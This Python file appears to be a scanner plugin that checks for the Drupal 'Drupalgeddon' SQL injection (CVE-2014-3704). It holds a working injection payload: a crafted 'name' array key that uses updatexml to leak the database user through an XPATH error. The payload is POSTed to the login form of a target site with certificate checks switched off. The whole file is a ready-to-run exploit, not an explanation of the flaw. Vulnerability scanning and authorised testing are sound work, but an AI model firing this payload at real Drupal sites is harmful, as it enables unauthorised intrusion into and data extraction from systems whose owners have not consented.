#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  ['https://www.cnblogs.com/kalixcn/p/17943303','https://blog.csdn.net/smli_ng/article/details/115496449'],

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Drupal < 7.32 “Drupalgeddon” SQL注入 CVE-2014-3704',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/19',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Accept':'*/*',
      'Accept-Language': 'en',
      'Connection': 'close',
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/?q=node&destination=node'
  data = "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if re.search(r'Warning.*?XPATH.*?syntax.*?error.*?@',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret